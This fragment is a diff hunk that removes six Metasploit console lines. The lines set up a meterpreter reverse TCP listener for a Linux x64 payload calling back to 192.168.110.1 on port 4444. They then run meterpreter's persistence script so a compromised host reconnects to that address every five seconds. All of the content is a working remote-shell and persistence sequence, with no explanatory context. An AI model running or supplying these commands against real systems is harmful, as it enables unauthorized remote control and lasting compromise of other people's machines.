@@ -1,6 +1,0 @@
-use exploit/multi/handler
-     set payload linux/x64/meterpreter/reverse_tcp
-     set LHOST 192.168.110.1
-     set LPORT 4444
-     exploit
-     meterpreter > run persistence -U -i 5 -r 192.168.110.1 -p 4444
